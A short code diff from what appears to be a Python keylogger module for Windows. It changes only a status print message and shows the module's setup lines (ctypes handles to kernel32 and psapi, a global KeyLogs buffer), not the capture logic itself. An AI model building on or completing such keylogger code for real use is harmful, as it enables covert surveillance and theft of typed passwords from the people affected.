@@ -10,7 +10,7 @@ kernel32 = ctypes.windll.kernel32
 psapi = ctypes.windll.psapi
 current_window = None
 
-print("We are in KeyLogger Module")
+print("[*] We are in KeyLogger Module")
 global KeyLogs
 KeyLogs = ""
 start_time = time.time()
